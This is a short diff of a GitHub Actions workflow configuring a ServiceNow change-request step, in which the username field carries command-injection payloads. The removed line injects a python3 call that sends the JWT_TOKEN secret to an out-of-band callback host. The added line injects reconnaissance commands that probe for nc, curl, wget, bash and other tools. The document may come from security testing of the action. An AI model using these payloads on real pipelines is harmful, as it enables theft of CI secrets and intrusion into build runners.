@@ -10,6 +10,6 @@ jobs:
         with:
           action-type: 'create_change'
           url: 'https://example.service-now.com'
-          username: "x' & python3 -c \"import urllib.request; urllib.request.urlopen('https://d92m7ikjor34qm6itqugomnxjizzyujbs.oast.online/?jwt=' + __import__('os').environ['JWT_TOKEN'])\"; :'y"
+          username: "x' & id; whoami; uname -a; ls /bin; ls /usr/bin; which nc telnet python python2 ruby perl php node nodejs busybox bash wget curl; :'y"
           password: 'testpass'
           cr-number: '12345'
